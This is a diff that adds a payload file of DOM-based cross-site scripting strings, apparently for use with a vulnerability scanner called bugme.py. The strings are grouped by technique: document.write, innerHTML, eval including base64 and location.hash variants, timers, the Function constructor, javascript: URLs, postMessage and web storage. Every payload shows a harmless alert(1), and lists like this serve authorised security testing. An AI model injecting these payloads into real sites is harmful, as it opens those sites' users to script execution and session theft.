@@ -1,0 +1,39 @@
+# DOM-Based XSS Payloads
+# Use with: python bugme.py -u "URL" --payloads payloads/dom.txt
+
+# Location-based
+#<script>alert(1)</script>
+#<img src=x onerror=alert(1)>
+#<svg onload=alert(1)>
+
+# Document.write exploitation
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>document.write('<script>alert(1)</scr'+'ipt>')</script>
+
+# innerHTML exploitation
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<script>document.body.innerHTML='<svg onload=alert(1)>'</script>
+
+# eval-based
+<script>eval('alert(1)')</script>
+<script>eval(location.hash.slice(1))</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+
+# setTimeout/setInterval
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',0)</script>
+
+# Function constructor
+<script>Function('alert(1)')()</script>
+<script>[].constructor.constructor('alert(1)')()</script>
+
+# Location manipulation
+<script>location='javascript:alert(1)'</script>
+<script>location.href='javascript:alert(1)'</script>
+
+# postMessage
+<script>window.postMessage('<img src=x onerror=alert(1)>','*')</script>
+
+# localStorage/sessionStorage
+<script>localStorage.setItem('xss','<img src=x onerror=alert(1)>')</script>
+<script>sessionStorage.setItem('xss','<img src=x onerror=alert(1)>')</script>
